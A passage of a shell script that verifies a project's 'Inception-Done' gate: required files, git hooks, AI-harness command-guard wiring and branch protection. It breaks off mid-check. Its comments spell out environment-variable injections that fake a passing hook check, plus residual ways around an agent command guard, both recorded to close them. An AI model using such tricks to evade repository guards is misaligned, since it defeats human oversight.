#!/bin/sh
# inception-done.sh — verify the Inception-Done gate (START-HERE.md / DEVELOPMENT-PROCESS.md §3)
# in a project directory. Usage: sh conformance/inception-done.sh [dir]   (default: .)
#          sh conformance/inception-done.sh --selftest   (mutation-proven fixture matrix; T3)
# NOTE: the gate is expected to FAIL at the kit root (the kit is the template source, not an
# instantiated project). It passes only in a project that has completed Inception. The --selftest
# mode is INDEPENDENT of that: it builds its own throwaway project fixtures (git clone/init) and
# asserts the gate's SPECIFIC leg/guard-line verdicts (repo live · hook live · harness-aware guard
# line) — never the whole-gate "OK" verdict, which would pull in the `export-ignore`d ADR/BACKLOG and
# couple the selftest to the tree it runs in. So it passes at the kit root, on an export tree, and for
# a fresh adopter (before their ADR/BACKLOG exist), and is wired as a control check.
# A green Inception-Done must mean the ENFORCEMENT SURFACE is PRESENT — not that a config
# file mentions it. So we assert a real git repo (T2.1) and an installed pre-push hook floor
# leg (T2.2), and the runtime-guard line is harness-aware (T2.3), driven by each adapter's
# OWN adapters/<h>/adapter.json .dimensions.command-guard.level — never a hardcoded harness list.
#
# Brownfield-foreign-hook rule (T2.2): the LIVE pre-push hook present + executable + carrying the
#   kit marker => PASS; absent, or the kit's marker but not executable => FAIL; present but NOT
#   the kit's (no marker) => PASS-with-note (a pre-existing hook incept declined to overwrite —
#   the "NOT overwriting" brownfield-safe case; we don't punish it).
# Two install modes (Δ6, HOOK-INSTALL-RECURS-PER-SLICE): WHICH file is "the live hook" is asked of
#   git, not assumed. Default => the installed copy at .git/hooks/pre-push (unchanged, greenfield's
#   incept.sh still installs it at birth). core.hooksPath resolving to the tree's OWN tracked hooks/
#   dir => TRACKED-HOOKS mode, where hooks/pre-push itself is live and no copy is required — the
#   brownfield-recommended one-time keystroke. Any OTHER redirect is not this mode: the leg falls
#   back to the default path and still FAILs when no kit hook is live there.
# Multi-harness rule (T2.3): each declared harness is classified by its adapter.json level. A
#   native adapter runs its declared command-guard check — on PASS we print the PreToolUse leg
#   labelled with that harness; a native adapter whose check FAILs is a FAIL. A floor adapter
#   NEVER prints the PreToolUse leg — it prints the floor message; the floor legs (repo+hook+CI)
#   are asserted globally regardless. Missing adapter.json / jq absent / unreadable level => FAIL
#   (fail-closed — never a silent PASS).
set -eu
# B6 rider (a): resolve_backend is the shared, non-vacuous backend reader (conformance/backlog-lib.sh)
# — sourced here the way its siblings (backlog-current.sh, backlog-presence.sh) already do, so this
# gate's backlog leg reads the same declaration the board gates read, rather than a second, looser
# literal-string grep. Resolved by $0's own dirname, BEFORE run_gate's `cd "$DIR"` below, so sourcing
# stays caller-cwd-independent.
. "$(dirname "$0")/backlog-lib.sh"
# B8: wf_is_deploy() — the SAME deployable derivation deployable-ready.sh uses (single source of
# truth), sourced BEFORE run_gate's `cd "$DIR"` below, so sourcing stays caller-cwd-independent.
. "$(dirname "$0")/wf-helpers.sh"
# B8 fix round 1 (reviewer Minor-3): resolve ci-gates.sh via THIS SCRIPT's own dirname — the same
# caller-cwd-independent convention the two sourcing lines above already use — never relative to
# the target tree run_gate `cd`s into below. A raw/partial adopter tree may have no ci-gates.sh of
# its own; the query must always run the invoking kit's copy, exactly as the disposition FILE
# (read from the target tree) and the QUERY SCRIPT (read from the kit) are two different subjects.
CI_GATES_SH="$(unset CDPATH; cd "$(dirname "$0")" && pwd)/ci-gates.sh"

# ── _id_git <git-args…> : run git with the ambient GIT_DIR/GIT_COMMON_DIR/GIT_WORK_TREE/GIT_INDEX_FILE
# and config-injection (GIT_CONFIG_COUNT/GLOBAL/SYSTEM/NOSYSTEM/GIT_CONFIG/GIT_CONFIG_PARAMETERS)
# families STRIPPED. Ported VERBATIM in shape from guard-wired.sh's _gw_git (SEC HIGH-1; B3 r3 MED-A;
# B3 r4) after review round 1 measured the identical hole HERE: the gate's hook leg asked git which
# file is live, with BARE git calls, so ambient env could answer for a DIFFERENT repo — measured, all
# three vectors flip a genuine "pre-push git hook missing" FAIL into a PASS (fixture (b7)):
#   GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=hooks
#   GIT_CONFIG_PARAMETERS="'core.hookspath'='hooks'"
#   GIT_DIR=<a repo whose OWN config carries the setting>/.git GIT_WORK_TREE=<the tree being judged>
# A gate whose verdict an environment variable can choose is not a gate. HOME/XDG_CONFIG_HOME are
# deliberately NOT stripped, for the reason guard-wired.sh states: they carry the operator's REAL
# global git config, which git also honours at push time, so stripping them would judge a config the
# push never uses. The `unset` is local to the subshell and never touches the caller's environment.
_id_git() {
  ( unset GIT_DIR GIT_COMMON_DIR GIT_WORK_TREE GIT_INDEX_FILE \
          GIT_CONFIG_COUNT GIT_CONFIG_GLOBAL GIT_CONFIG_SYSTEM GIT_CONFIG_NOSYSTEM \
          GIT_CONFIG GIT_CONFIG_PARAMETERS; git "$@" )
}

# ── _id_head_matches <file> : 0 = <file> is byte-identical to HEAD:hooks/pre-push · 1 = it DIFFERS ·
# 2 = the tracked blob could not be materialized (never reported as a match). Sibling of
# guard-wired.sh's _gw_head_matches, for the same compare-first precedence (review round 1 BLOCKER).
_id_head_matches() {
  _idhm_t=$(mktemp 2>/dev/null) || return 2
  if ! _id_git show "HEAD:hooks/pre-push" > "$_idhm_t" 2>/dev/null; then rm -f "$_idhm_t"; return 2; fi
  if cmp -s "$_idhm_t" "$1" 2>/dev/null; then rm -f "$_idhm_t"; return 0; fi
  rm -f "$_idhm_t"; return 1
}

# ── run_gate [dir] : the Inception-Done gate. All FAIL paths accumulate into `fail`; a non-zero
#    `fail` yields a non-zero return. These accumulators are the mutation surface non-vacuity.sh
#    neuters — every one is caught by a negative fixture in selftest() below.
run_gate() {
DIR="${1:-.}"
cd "$DIR"
fail=0
is_repo=0
HARNESSES=''

need() { if [ -e "$1" ]; then echo "PASS present: $1"; else echo "FAIL missing: $1"; fail=1; fi; }

need ENGINEERING-PRINCIPLES.md
need CLAUDE.md
need RUNBOOK.md
need .env.example
# .claude is required on EVERY harness, not only claude-code: the neutral guard core physically lives at
# .claude/hooks/guard-core.sh and every harness's pre-push FLOOR (hooks/pre-push via scripts/kit-guard)
# sources it from there. Dropping this requirement for a floor-only harness would pass Inception with
# no working guard. Relocating the core to a neutral home is boarded (GUARD-CORE-NEUTRAL-HOME, folded
# into the G8 per-segment guard slice); until then the message says WHY rather than hiding it.
if [ -e .claude ]; then
  echo "PASS present: .claude (guard-core home — sourced by every harness's pre-push floor)"
else
  echo "FAIL missing: .claude — required on every harness (not Claude-Code-only): the pre-push floor sources .claude/hooks/guard-core.sh from it (relocation boarded: GUARD-CORE-NEUTRAL-HOME)"; fail=1
fi

# CI pipeline — platform-aware: accept the GitHub OR GitLab path (incept writes one per --ci),
# so a GitLab adopter doesn't dead-end at this gate (it hard-required the GitHub path before).
if [ -f .github/workflows/ci.yml ] || [ -f .gitlab-ci.yml ]; then
  echo "PASS present: CI pipeline (.github/workflows/ci.yml or .gitlab-ci.yml)"
else
  echo "FAIL missing: a CI pipeline (.github/workflows/ci.yml or .gitlab-ci.yml)"; fail=1
fi

# T2.1 (F2) — a real git repo must exist. The runtime guard's floor leg is installed into
# .git/hooks; without a repo there is nothing to enforce. This alone fails the adopter walk.
if _id_git rev-parse --is-inside-work-tree >/dev/null 2>&1; then
  echo "PASS: git repository present (.git)"
  is_repo=1
else
  echo "FAIL: not a git repository — run 'git init' (Inception installs the runtime guard into .git/hooks)"; fail=1
fi

# T2.2 (F2) — the pre-push git-hook FLOOR leg must be actually installed, not merely provided.
# Marker 'KIT_GUARD_CORE' is a stable, guard-specific token in hooks/pre-push (its core-source
# path var); a foreign hook won't carry it. See the brownfield-foreign-hook rule in the header.
if [ "$is_repo" -eq 1 ]; then
  # Δ6 (HOOK-INSTALL-RECURS-PER-SLICE) — TWO INSTALL MODES, both accepted. This leg used to hard-code
  # the default hooks path, so the one-time `core.hooksPath` keystroke that ends the per-slice re-copy
  # treadmill left this gate failing forever (and brownfield.md said so out loud). It now asks git
  # WHICH FILE IS LIVE: `git rev-parse --git-path hooks/pre-push` respects core.hooksPath, and when
  # the answer lands in the tree's OWN tracked hooks/ directory the tracked file IS the live hook —
  # tracked-hooks mode. Any OTHER redirect (husky/lefthook) is NOT this mode: the leg falls back to
  # the default path and keeps its teeth, so one foreign config cannot buy a free pass past the hook
  # leg. Greenfield stays as it was: incept.sh installs the copy at birth; a repo flips later by the
  # same one-time human keystroke.
  HOOK=.git/hooks/pre-push
  HOOKMODE=installed
  _id_hp=$(_id_git config --get core.hooksPath 2>/dev/null || true)
  if [ -n "$_id_hp" ]; then
    _id_top=$(_id_git rev-parse --show-toplevel 2>/dev/null || true)
    _id_live=$(_id_git rev-parse --git-path hooks/pre-push 2>/dev/null || true)
    _id_livedir=""
    _id_wantdir=""
    if [ -n "$_id_live" ]; then
      _id_livedir=$( CDPATH='' cd -- "$(dirname -- "$_id_live")" 2>/dev/null && pwd -P ) || _id_livedir=""
    fi
    if [ -n "$_id_top" ]; then
      _id_wantdir=$( CDPATH='' cd -- "$_id_top/hooks" 2>/dev/null && pwd -P ) || _id_wantdir=""
    fi
    if [ -n "$_id_livedir" ] && [ -n "$_id_wantdir" ] && [ "$_id_livedir" = "$_id_wantdir" ]; then
      # M7 (review round 1): the file git ITSELF named, not a second spelling of it re-derived here —
      # one source of truth for "which file is live", already proven equal to this repo's own hooks/.
      HOOK="$_id_live"
      HOOKMODE=tracked
    fi
  fi
  # COMPARE-FIRST in tracked-hooks mode (review round 1 BLOCKER, mirroring guard-wired.sh): the marker
  # test below is a short-circuit, and in this mode the live hook is the WORKING-TREE file — so a
  # tampered hook with the KIT_GUARD_CORE line DELETED (the shape a cd-basename write produces —
  # GUARD-BASENAME-AFTER-CD-BYPASS now denies the single-command quote-free case in real time, its
  # persisted-cwd/$VAR residuals still produce it) took the reassuring "foreign hook preserved"
  # PASS-with-note while running arbitrary code
  # on push. A tracked file that DIFFERS from HEAD is judged first, marker or no marker; a file that
  # MATCHES HEAD and carries no marker still takes the brownfield note (fixture (b6) locks that, so
  # the cure stays PRECEDENCE and never becomes "no marker => FAIL").
  _id_hm_rc=0
  _id_track_uncomparable=none    # none | committed-missing | unborn (review round 2 m2)
  if [ "$HOOKMODE" = tracked ] && [ -f "$HOOK" ]; then
    if _id_git cat-file -e "HEAD:hooks/pre-push" 2>/dev/null; then
      _id_head_matches "$HOOK" || _id_hm_rc=$?
    elif _id_git rev-parse --verify -q HEAD >/dev/null 2>&1; then
      # HEAD EXISTS but does NOT track hooks/pre-push — the live hook was never committed even though
      # a baseline was, so it evades the committed tree and cannot be compared against it. This is the
      # real evasion state, and guard-wired.sh REDs exactly it (its tracked "missing from HEAD" FAIL);
      # the mirror agrees. Review round 2 m2 closed the fail-OPEN where the old `else` set this to 0
      # ("verified match") and an uncomparable live hook PASSed as verified.
      _id_track_uncomparable=committed-missing
    else
      # UNBORN HEAD — the repo has no commits at all, so there is genuinely nothing to compare the
      # live hook against. Deliberately NOT the same verdict as guard-wired's blanket RED here (m2
      # decision, stated): inception-done is the gate most likely to meet a pre-first-commit tree,
      # and red-ing the hook's *freshness* on a tree that has committed nothing would blame this leg
      # for a pre-baseline state other steps own. It is not a tamper. But it is also NOT verified —
      # so it takes an honest N/A that never prints the "live via tracked-hooks mode" PASS, closing
      # requirement (a) while not false-RED-ing a legitimate no-commits tree (requirement b).
      _id_track_uncomparable=unborn
    fi
  fi
  if [ ! -f "$HOOK" ]; then
    if [ "$HOOKMODE" = tracked ]; then
      echo "FAIL: pre-push git hook missing ($HOOK) — this repo runs tracked-hooks mode (core.hooksPath names its own hooks/ dir), so hooks/pre-push IS the live hook and this checkout has none: restore it (git restore -- hooks/pre-push) or copy the kit's hooks/pre-push back  (do NOT re-run incept — see docs/adoption/brownfield.md)"; fail=1
    else
      echo "FAIL: pre-push git hook missing ($HOOK) — install it (human step; an agent cannot set the mode): cp hooks/pre-push $HOOK && chmod +x $HOOK  (brownfield: do NOT re-run incept — see docs/adoption/brownfield.md)"; fail=1
    fi
  elif [ "$_id_hm_rc" -eq 1 ]; then
    echo "FAIL: pre-push git hook $HOOK is MODIFIED in the working tree — in tracked-hooks mode that file IS the live hook, so what git runs on push is not what this tree carries under review: restore it (git restore -- hooks/pre-push) or commit it"; fail=1
  elif [ "$_id_hm_rc" -eq 2 ]; then
    echo "FAIL: pre-push git hook $HOOK could not be compared against tracked HEAD:hooks/pre-push — an unverifiable live hook is not a verified one"; fail=1
  elif [ "$_id_track_uncomparable" = committed-missing ]; then
    echo "FAIL: pre-push git hook $HOOK — tracked-hooks mode, but hooks/pre-push is not committed at HEAD, so the LIVE hook evades the committed baseline and cannot be verified against it: commit it (git add hooks/pre-push && git commit). Mirrors guard-wired's tracked 'missing from HEAD'."; fail=1
  elif [ "$_id_track_uncomparable" = unborn ]; then
    echo "N/A: pre-push git hook $HOOK present in tracked-hooks mode, but the repo has NO commits yet (HEAD unborn) — nothing committed to compare the live hook against; commit the baseline (docs/adoption/brownfield.md §2 step 5). NOT counted as a verified guard."
  elif grep -q 'KIT_GUARD_CORE' "$HOOK" 2>/dev/null; then
    if [ -x "$HOOK" ]; then
      if [ "$HOOKMODE" = tracked ]; then
        echo "PASS present: pre-push git hook live via tracked-hooks mode (core.hooksPath -> this repo's own hooks/; the tracked hooks/pre-push IS the live hook — no installed copy to keep fresh)"
      else
        echo "PASS present: pre-push git hook installed and executable (kit runtime guard)"
      fi
    elif [ "$HOOKMODE" = tracked ]; then
      echo "FAIL: pre-push git hook present but not executable ($HOOK) — git silently ignores it; in tracked-hooks mode the exec bit is a TRACKED file mode, so set it and commit (human step): chmod +x $HOOK && git add --chmod=+x $HOOK"; fail=1
    else
      echo "FAIL: pre-push git hook present but not executable ($HOOK) — set the mode (human step): chmod +x $HOOK  (brownfield: do NOT re-run incept)"; fail=1
    fi
  else
    echo "PASS (note): pre-push git hook present but not the kit's (foreign hook preserved — brownfield 'NOT overwriting' case); kit guard is not managing it"
  fi
else
  echo "SKIP: pre-push git-hook check — not a git repository (see the repo failure above)"
fi

if ls docs/architecture/ADR-000*.md >/dev/null 2>&1; then
  echo "PASS present: docs/architecture/ADR-000*.md"
else
  echo "FAIL missing: docs/architecture/ADR-000*.md"; fail=1
fi

# B6 rider (a): read the declaration with resolve_backend (the same reader backlog-current.sh /
# backlog-presence.sh use), NOT a literal `grep -q "Backlog backend"` — that literal grep matched the
# FIELD NAME even when its value is still the unfilled choice-list placeholder
# (`Backlog backend (§...): [md/github/jira/ado/linear/gitlab]`), so an adopter who never actually
# chose a backend passed Inception-Done and then every board gate silently N/A'd forever (the
# measured defect; the negative fixture below is exactly this CLAUDE.md). resolve_backend treats an
# unfilled choice-list as UNDECLARED (empty), same as a wholly absent field — so this leg now agrees
# with what the board gates will actually see. Fail-CLOSED on `unrecognized:*` (a fat-fingered token
# like `markdow`): that must not be silently accepted as "some backend is declared".
_id_tok=$(resolve_backend "." 2>/dev/null || true)
case "$_id_tok" in
  unrecognized:*)
    echo "FAIL: backlog backend '${_id_tok#unrecognized:}' is not a recognized token (known: md github jira ado linear gitlab) — fix CLAUDE.md's Backlog backend field"; fail=1 ;;
  '')
    if [ -f BACKLOG.md ]; then
      echo "PASS present: backlog (BACKLOG.md present; no explicit backend declared in CLAUDE.md)"
    else
      echo "FAIL missing: BACKLOG.md or a declared backlog backend (CLAUDE.md's Backlog backend field is absent or still the unfilled choice-list placeholder)"; fail=1
    fi ;;
  *)
    echo "PASS present: backlog (declared backend: $_id_tok)" ;;
esac

# project CLAUDE.md key header fields must be filled (no leftover placeholders)
if grep -Eq '\*\*Project:\*\* \[name\]|\*\*Intent owner:\*\* \[who owns' CLAUDE.md 2>/dev/null; then
  echo "FAIL: project CLAUDE.md key fields not filled (Project / Intent owner)"; fail=1
else
  echo "PASS: project CLAUDE.md key header fields filled"
fi

# the Target harness(es) field must be stamped AND every selected adapter must conform to the
# boundary contract — the Inception-Done enforcement of the harness floor (brownfield-critical:
# an adopter's merged repo can't pass Inception until its declared adapter(s) actually conform).
hline=$(grep -E '^\- \*\*Target harness\(es\)\*\*' CLAUDE.md 2>/dev/null || true)
if [ -z "$hline" ]; then
  echo "FAIL: project CLAUDE.md missing the Target harness(es) field"; fail=1
else
  # value after the '(§harness-neutrality): ' marker, first whitespace token (the comma-list)
  hval=$(printf '%s' "$hline" | sed 's/^.*(§harness-neutrality): *//' | cut -d' ' -f1)
  case "$hval" in
    *'['*|'') echo "FAIL: Target harness(es) not stamped (placeholder remains)"; fail=1 ;;
    *)
      for _h in $(printf '%s' "$hval" | tr ',' ' '); do
        _h=$(printf '%s' "$_h" | sed 's/[[:punct:][:space:]]*$//')  # G13: tolerate a trailing period/space in the stamped value
        [ -z "$_h" ] && continue
        HARNESSES="$HARNESSES $_h"  # T2.3: resolved list feeds the harness-aware runtime-guard leg below
        if ! [ -d "adapters/$_h" ]; then
          echo "FAIL: harness adapter '$_h' directory not found — expected: adapters/$_h"; fail=1
        elif sh conformance/harness-adapter.sh "adapters/$_h" >/dev/null 2>&1; then
          echo "PASS: harness adapter '$_h' conforms to the boundary contract"
        else
          echo "FAIL: harness adapter '$_h' does not conform — run: sh conformance/harness-adapter.sh adapters/$_h"; fail=1
        fi
      done ;;
  esac
fi

# T2.3 (F3) — harness-aware runtime-guard leg. Classify EACH declared harness by its OWN
# adapters/<h>/adapter.json .dimensions.command-guard.level (never a hardcoded name list), so
# the gate's claim and the incept notice's honesty cannot diverge. See the multi-harness rule
# in the header. Fail-closed: no harness resolved / jq absent / json missing / level unreadable.
if [ -z "$HARNESSES" ]; then
  echo "FAIL: runtime-guard leg — no target harness resolved, cannot classify command-guard (fail-closed)"; fail=1
elif ! command -v jq >/dev/null 2>&1; then
  echo "FAIL: runtime-guard leg UNVERIFIED — jq absent, cannot read adapters/<h>/adapter.json command-guard level (fail-closed)"; fail=1
else
  for _h in $HARNESSES; do
    _aj="adapters/$_h/adapter.json"
    if [ ! -f "$_aj" ]; then
      echo "FAIL: runtime-guard leg — $_aj missing, cannot classify '$_h' command-guard (fail-closed)"; fail=1; continue
    fi
    _lvl=$(jq -r '.dimensions."command-guard".level // empty' "$_aj" 2>/dev/null || true)
    case "$_lvl" in
      native)
        _chk=$(jq -r '.dimensions."command-guard".proof.check // empty' "$_aj" 2>/dev/null || true)
        [ -n "$_chk" ] || _chk="conformance/guard-wired.sh"
        # B3 r3 HIGH-A: mirrored in conformance/harness-adapter.sh's native_proof_ok() (search
        # "closed kit-owned allowlist" there) — change both. Parse: path = first token; OPTIONALLY
        # one scoped flag token after ONE space, from the SAME closed kit-owned allowlist as
        # harness-adapter.sh (currently just `--rung1-only`) — never an open charset. A second
        # token, or a space with an EMPTY remainder (a bare trailing space), is rejected, not run
        # bare. Without this mirror, a manifest whose proof.check carries a flag (e.g.
        # `"conformance/guard-wired.sh --rung1-only"`) fails `[ -f ]` on the WHOLE string and,
        # even if that happened to resolve, would run `sh "$_chk" .` — the flag and the tree arg
        # collapsed into one un-split word — so every claude-code adopter's Inception gate
        # hard-failed with a false "missing" message (measured).
        _chkpath="$_chk"; _chkflag=""; _chkbad=0
        case "$_chk" in
          *' '*)
            _chkpath=${_chk%% *}
            _chkrest=${_chk#* }
            case "$_chkrest" in
              *' '*) _chkbad=1 ;;   # a second token => reject (one flag, never more)
              '')    _chkbad=1 ;;   # trailing space, empty remainder => reject, not a bare run
              *)     _chkflag=$_chkrest ;;
            esac ;;
        esac
        if [ "$_chkbad" -eq 0 ] && [ -n "$_chkflag" ]; then
          case "$_chkflag" in
            --rung1-only) : ;;   # <- extension point: add one case arm per kit-defined scoped flag
            *) _chkbad=1 ;;
          esac
        fi
        if [ "$_chkbad" -eq 0 ]; then
          case "$_chkpath" in
            conformance/*.sh) : ;;
            *) _chkbad=1 ;;
          esac
        fi
        if [ "$_chkbad" -eq 0 ] \
           && { printf '%s' "$_chkpath" | grep -Eq '[^A-Za-z0-9._/-]' || printf '%s' "$_chkpath" | grep -q '\.\.'; }; then
          _chkbad=1
        fi
        if [ "$_chkbad" -ne 0 ] || [ ! -f "$_chkpath" ] || [ -L "$_chkpath" ]; then
          echo "FAIL: '$_h' declares command-guard=native but its check '$_chk' is missing or invalid (fail-closed)"; fail=1
        else
          # three-state, mirroring guard-wired: 0 wired · 2 UNVERIFIED (jq) · 1 dark — fail-closed on 1/2.
          # Flag BEFORE the tree arg (guard-wired.sh's own documented order: `--rung1-only [dir]`).
          if [ -n "$_chkflag" ]; then
            if sh "$_chkpath" "$_chkflag" . >/dev/null 2>&1; then gw=0; else gw=$?; fi
          else
            if sh "$_chkpath" . >/dev/null 2>&1; then gw=0; else gw=$?; fi
          fi
          if [ "$gw" -eq 0 ]; then
            echo "PASS: '$_h' runtime guard wired (PreToolUse → guard.sh, matcher admits mutating tools) [native, via $_chk]"
          elif [ "$gw" -eq 2 ]; then
            echo "FAIL: '$_h' runtime guard wiring UNVERIFIED — install jq (the guard hook needs it too), then: sh $_chk"; fail=1
          else
            echo "FAIL: '$_h' runtime guard not wired — run: sh $_chk"; fail=1
          fi
        fi ;;
      floor)
        echo "PASS: runtime guard = floor (git hook + CI backstop); '$_h' has no inline command-guard (by design — adapter declares command-guard=floor)" ;;
      *)
        echo "FAIL: '$_h' command-guard level unreadable ('${_lvl:-<empty>}') in $_aj (fail-closed)"; fail=1 ;;
    esac
  done
fi

# ── Branch-protection leg (K5). MODE strict (default) | surface. GitHub -> live verify via
#    branch-protection.sh --raw (we apply our OWN policy, never its CI-collapsed exit). Non-GitHub
#    -> a recorded CLAUDE.md attestation. No remote -> outstanding/fatal per mode. exit 1
#    (verified-unprotected) is fatal in BOTH modes; unverifiable is fatal only in strict.
MODE="${MODE:-strict}"
if [ "$is_repo" -ne 1 ]; then
  echo "SKIP: branch-protection leg — not a git repository (see the repo failure above)"
else
  _remote=$(git remote get-url origin 2>/dev/null || true)
  if [ -z "$_remote" ]; then
    if [ "$MODE" = surface ]; then
      echo "OUTSTANDING: branch protection — no remote configured yet; protect main on the remote before entering the loop"
    else
      echo "FAIL: branch protection — no remote configured; main cannot be protected (not loop-ready). Add a protected remote, or run --surface for the local-surface check"; fail=1
    fi
  else
    case "$_remote" in
      *github.com*)
        # OUTPUT is read, not only rc (V1 repair PR 2): since B4 the live leg names declared-but-unbound
        # contexts on rc 1, and an incepted repo now DECLARES the four gates incept installs — "protected"
        # with none bound is the fail-open state this leg refuses, so it is named with the remedy.
        if _bpo=$(sh conformance/branch-protection.sh --raw 2>/dev/null); then _bp=0; else _bp=$?; fi
        # The names are TREE-CONTROLLED text reaching the operator's display: sanitized (R-3: no control
        # bytes, bounded), and they can only NARROW the verdict to a FAIL — nothing parsed here can produce
        # a PASS. Producer wording is mirror-locked by selftest cell h4m so a reword cannot degrade the remedy.
        _bpu=$(printf '%s\n' "$_bpo" | sed -n 's/^FAIL: required-check context(s) declared in .* but not live on [^:]*: \(.*\) — run: .*$/\1/p' | head -1 | tr -d '[:cntrl:]' | cut -c1-200)
        _bpf=$(printf '%s\n' "$_bpo" | grep -c '^FAIL:')   # rc 1 is COMPOUND: the unbound arm is taken only when it is the SOLE failure
        case "$_bp" in
          0) echo "PASS: verified protected (main, GitHub)" ;;
          1) if [ -n "$_bpu" ] && [ "$_bpf" = 1 ]; then
               # surface = OUTSTANDING (a post-first-CI-run keystroke fixes it); any OTHER failure (no reviews
               # required, protection absent) stays FAIL in both modes and is echoed below.
               if [ "$MODE" = surface ]; then
                 echo "OUTSTANDING: branch protection — main is protected but declared required context(s) are NOT bound: ${_bpu} — run: sh scripts/branch-protection-apply.sh --apply (after the first CI run)"
               else
                 echo "FAIL: branch protection — main is protected but declared required context(s) are NOT bound: ${_bpu} — the gates incept installed do not block a merge until bound; run: sh scripts/branch-protection-apply.sh --apply"; fail=1
               fi
             else
               printf '%s\n' "$_bpo" | grep '^FAIL:' | tr -d '[:cntrl:]' | cut -c1-240 | sed 's/^/  /'
               echo "FAIL: branch protection — main is NOT protected on GitHub (required PR reviews / status checks missing)"; fail=1
             fi ;;
          2) if [ "$MODE" = surface ]; then
               echo "OUTSTANDING: branch protection — GitHub state unverifiable (gh missing/unauthenticated, OR the remote repo is inaccessible/nonexistent); re-run authenticated against a live repo, or in CI"
             else
               echo "FAIL: branch protection — GitHub state unverifiable (gh missing/unauthenticated, OR the remote repo is inaccessible/nonexistent) and verification is required (strict); authenticate gh / check the remote exists, or run --surface"; fail=1
             fi ;;
          *) echo "FAIL: branch protection — branch-protection.sh returned an unexpected status ($_bp); fail-closed"; fail=1 ;;
        esac ;;
      *)
        _bpl=$(grep -E '^\- \*\*Branch protection\*\*' CLAUDE.md 2>/dev/null | head -1 || true)
        _bpv=$(printf '%s' "$_bpl" | sed 's/^.*(§branch-protection): *//')
        # A real attestation is "attested:<...>" with NO residual template placeholder markers
        # (< > [ ]); an adopter who leaves the angle-bracket placeholder is NOT attested (fail-closed,
        # same discipline as the Target harness placeholder guard above).
        _attested=0
        case "$_bpv" in attested:*) _attested=1 ;; esac
        case "$_bpv" in *'<'*|*'>'*|*'['*|*']'*) _attested=0 ;; esac
        if [ "$_attested" = 1 ]; then
          echo "PASS: branch protection attested (non-GitHub host) [${_bpv}]"
        elif [ "$MODE" = surface ]; then
          echo "OUTSTANDING: branch protection — non-GitHub remote, no valid attestation recorded (stamp '- **Branch protection** (§branch-protection): attested: HOST and MECHANISM' in CLAUDE.md, no angle brackets; docs/adoption/vc-hosts.md)"
        else
          echo "FAIL: branch protection — non-GitHub remote and no valid recorded attestation (stamp '- **Branch protection** (§branch-protection): attested: HOST and MECHANISM' in CLAUDE.md, no angle brackets, or run --surface); docs/adoption/vc-hosts.md"; fail=1
        fi ;;
    esac
  fi
fi

# ── B8 §4.3 (GATE-PROVENANCE-SELF-DISABLES-AND-NEVER-GATES-THE-MERGE, PHASE-B-SPINE) — the
# gate-provenance repo-class leg. MODE strict (default) | surface, same shape as the
# branch-protection leg above. Trigger: the incepted tree DERIVES deployable (Dockerfile OR any
# workflow wf_is_deploy — deployable-ready.sh's own derivation, reused, not re-invented) AND the
# forge probe reports isPrivate && !isInOrganization. On a private, user-owned repo the SLSA
# provenance/image-provenance CI job(s) never run at all (profiles/*/ci.yml's push-only+visibility
# `if:`, provenance-precondition.sh-locked) — so nothing would ever surface the gap once Inception
# passes. A validated `na` disposition for gate-provenance is a conscious decision, not silence,
# and is not blocked twice.
if [ "$is_repo" -ne 1 ]; then
  echo "SKIP: gate-provenance repo-class leg — not a git repository (see the repo failure above)"
else
  _id_deployable=0
  [ -f Dockerfile ] && _id_deployable=1
  if [ "$_id_deployable" -eq 0 ] && [ -d .github/workflows ]; then
    for _id_wf in .github/workflows/*.yml .github/workflows/*.yaml; do
      [ -f "$_id_wf" ] || continue
      if wf_is_deploy "$_id_wf"; then _id_deployable=1; break; fi
    done
  fi
  if [ "$_id_deployable" -eq 0 ]; then
    echo "N/A: gate-provenance repo-class — no deploy surface (no Dockerfile / deploy workflow); not a deployable service"
  else
    # Direct expansion, NOT `sh -c "$VAR"` — preflight.sh's check_repo_class's own precedent for this
    # exact probe (`${PREFLIGHT_GH_CMD:-gh repo view ...}`). `sh -c "$VAR"` hands the string to a FRESH
    # shell for full re-parsing, so a JSON fixture's unquoted `{...,...}` undergoes brace expansion
    # there (measured on this box's /bin/sh, bash-as-sh) and silently mangles the stub's own JSON.
    # Direct expansion evaluates the variable's value as an already-expanded word (split, not
    # re-parsed), so the braces stay literal — the same reason adopter-preflight-wired.sh's identical
    # fixture shape works.
    # [reviewer Minor-5b + security LOW-2, fix round 1] INCEPTION_DONE_GH_CMD trust class: it is
    # honored ONLY from the invoker's OWN environment, by direct expansion — never re-parsed from
    # repo/PR content, and there is no code path that lets a repository's own files set it. Same
    # tier as PREFLIGHT_GH_CMD (trusted-invocation-only; see that script's own SECURITY header).
    _id_gh_json=""
    if [ -n "${INCEPTION_DONE_GH_CMD:-}" ] || command -v gh >/dev/null 2>&1; then
      _id_gh_json=$(${INCEPTION_DONE_GH_CMD:-gh repo view --json isPrivate,isInOrganization} 2>/dev/null) || _id_gh_json=""
    fi
    if [ -z "$_id_gh_json" ] || ! command -v jq >/dev/null 2>&1; then
      if [ "$MODE" = surface ]; then
        echo "OUTSTANDING: gate-provenance repo-class — GitHub repo visibility unverifiable (gh/jq missing/unauthenticated, or an unresolvable remote); re-run authenticated, or in CI"
      else
        echo "FAIL: gate-provenance repo-class — GitHub repo visibility unverifiable and verification is required (strict); authenticate gh + install jq, or run --surface"; fail=1
      fi
    else
      _id_priv=$(printf '%s' "$_id_gh_json" | jq -r '.isPrivate' 2>/dev/null || echo "")
      _id_org=$(printf '%s' "$_id_gh_json" | jq -r '.isInOrganization' 2>/dev/null || echo "")
      # [security MED-1, fix round 1] a PARSE FAILURE — either field is anything other than exactly
      # `true` or `false` (garbage JSON, a jq error swallowed above, a schema change) — is
      # UNVERIFIABLE, never the affirmative public/org PASS below. Checked BEFORE the true/false
      # branch, mirroring the no-gh/no-jq arm's own posture (strict FAIL / surface OUTSTANDING),
      # never a silent green on a value this gate could not actually parse.
      case "$_id_priv" in true|false) : ;; *) _id_priv="" ;; esac
      case "$_id_org" in true|false) : ;; *) _id_org="" ;; esac
      if [ -z "$_id_priv" ] || [ -z "$_id_org" ]; then
        if [ "$MODE" = surface ]; then
          echo "OUTSTANDING: gate-provenance repo-class — GitHub repo visibility unverifiable (malformed/unparseable gh response); re-run authenticated, or in CI"
        else
          echo "FAIL: gate-provenance repo-class — GitHub repo visibility unverifiable (malformed/unparseable gh response) and verification is required (strict); re-authenticate gh, or run --surface"; fail=1
        fi
      elif [ "$_id_priv" = "true" ] && [ "$_id_org" = "false" ]; then
